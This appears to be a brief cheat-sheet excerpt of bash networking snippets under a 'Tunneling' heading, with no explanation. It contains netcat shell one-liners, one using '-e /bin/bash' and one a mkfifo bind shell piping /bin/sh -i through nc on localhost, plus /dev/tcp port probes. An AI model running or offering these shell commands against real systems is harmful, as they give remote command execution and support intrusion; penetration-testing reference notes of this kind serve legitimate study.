## Networking
### Tunneling
```bash
nc -vlnp 4444
nc localhost 4444 -e /bin/bash

timeout 0.5 echo 2>/dev/null < /dev/tcp/localhost/80 && echo "open" || echo "closed"

timeout 0.5 echo < /dev/tcp/localhost/80 && echo "open" || echo "closed"
```
```bash
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
```
